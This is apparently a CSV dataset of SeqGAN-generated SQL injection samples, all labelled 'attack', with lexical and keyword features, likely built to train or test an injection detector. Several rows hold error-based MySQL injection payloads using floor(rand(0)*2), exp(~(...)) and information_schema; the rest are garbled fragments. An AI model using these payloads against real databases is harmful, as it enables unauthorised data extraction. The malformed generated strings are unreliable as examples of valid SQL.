label,payload,family,payload_type,method,run_id,sample_index,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,keyword_total
attack,"1%4838Sf528382zuw""  )   and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and   (  ""blfbbzl",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,0,331.0,41.0,4.133544971140152,114.0,65.0,117.0,35.0,0.34441087613293053,0.19637462235649547,0.35347432024169184,0.10574018126888217,0.0,2.0,0.0,0.0,2.0,1.0,0.0,22.0,1.0,0.0,6.0,4.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,1.0,1.0,0.0,6.0,3.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,13.0
attack,-CmU>  ||ch,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,1,11.0,9.0,3.095795255000934,5.0,0.0,2.0,4.0,0.45454545454545453,0.0,0.18181818181818182,0.36363636363636365,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,"1""   )    )     )   and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (     (  "" select whereror",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,2,227.0,30.0,3.387228924754042,61.0,32.0,105.0,29.0,0.2687224669603524,0.14096916299559473,0.46255506607929514,0.1277533039647577,0.0,2.0,0.0,0.0,1.0,1.0,0.0,20.0,0.0,0.0,4.0,2.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,4.0,0.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,8.0
attack,"'hadT  (  )    '   )    )    (  , ,0x717a767a71  aunuynabbb",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,3,59.0,18.0,3.259453965115938,17.0,9.0,24.0,9.0,0.288135593220339,0.15254237288135594,0.4067796610169492,0.15254237288135594,2.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0,0.0,0.0,2.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,-j  =aa_grv2bnbnasdu'  =  'taal,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,4,31.0,18.0,3.8213119401041733,18.0,1.0,6.0,6.0,0.5806451612903226,0.03225806451612903,0.1935483870967742,0.1935483870967742,2.0,0.0,1.0,0.0,0.0,2.0,0.0,0.0,0.0,1.0,0.0,3.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,1'_,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,5,3.0,3.0,1.584962500721156,0.0,1.0,0.0,2.0,0.0,0.3333333333333333,0.0,0.6666666666666666,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,1gu,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,6,3.0,3.0,1.584962500721156,2.0,1.0,0.0,0.0,0.6666666666666666,0.3333333333333333,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,"1%L1%'||  (  select 'MCbz
",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,7,26.0,17.0,3.8692996998935225,11.0,2.0,6.0,7.0,0.4230769230769231,0.07692307692307693,0.23076923076923078,0.2692307692307692,2.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,2.0,0.0,0.0,2.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
attack,"1-' where 2291  =  2291 or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a   )    )   +'     3326",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,8,291.0,39.0,3.9937099598181875,101.0,47.0,108.0,35.0,0.3470790378006873,0.16151202749140894,0.3711340206185567,0.12027491408934708,2.0,0.0,1.0,0.0,2.0,2.0,0.0,19.0,0.0,2.0,5.0,6.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,1.0,2.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,9.0
attack,1%ytl7881unau',error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,9,14.0,11.0,3.3787834934861753,7.0,5.0,0.0,2.0,0.5,0.35714285714285715,0.0,0.14285714285714285,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
